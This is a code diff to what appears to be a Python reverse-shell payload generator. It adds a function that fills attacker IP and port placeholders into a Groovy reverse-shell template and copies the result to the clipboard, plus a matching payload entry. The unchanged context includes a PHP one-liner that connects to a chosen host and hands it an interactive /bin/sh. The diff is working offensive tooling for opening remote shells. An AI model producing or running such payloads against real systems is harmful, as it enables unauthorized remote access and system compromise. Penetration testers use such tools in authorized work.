@@ -86,6 +86,23 @@ def php_file_pentestmonkey(payload=None):
     print(info("File created and updated as: " + filename))
 
 
+def replace_variables(payload=None):
+    dir = getcwd()
+    fin = open(dir + "/" + payload['function']['file'])
+
+    output=""
+    for line in fin:
+        if 'IP' in line:
+            output = output + line.replace('IP', str(args.host))
+        elif 'PORT' in line:
+            output = output + line.replace('PORT', str(args.port))
+        else:
+            output = output + line
+    print(output + "\n Copied to clipboard")
+    pyperclip.copy(output)
+    fin.close()
+
+
 # Other resources
 # http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
 
@@ -252,6 +269,11 @@ payloads = [
                 'payload': 'php -r \'$sock = fsockopen("{host}",{port}); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); \''.format(
                     host=args.host, port=args.port),
                 'function': {'function_name': oneliner}
+            },
+            {
+                'title': '',
+                'payload': 'Groovy Console',
+                'function': {'function_name': replace_variables, 'file': 'shells/reverse.groovy'}
             },
             {
                 'title': '',
